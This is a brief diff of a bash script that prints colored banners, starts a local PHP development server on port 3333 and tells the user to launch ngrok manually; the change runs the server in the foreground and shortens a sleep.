@@ -179,8 +179,8 @@ echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   -------------------
 echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !   PHP SERVER NOW STARTING   !  \e[0m'
 echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
 echo ""
-php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
-sleep 14
+php -S localhost:3333
+sleep 2
 echo "Loalhost: 127.0.0.1:3333"
 echo ""
 echo "You have to start ngrok manually on port 3333"
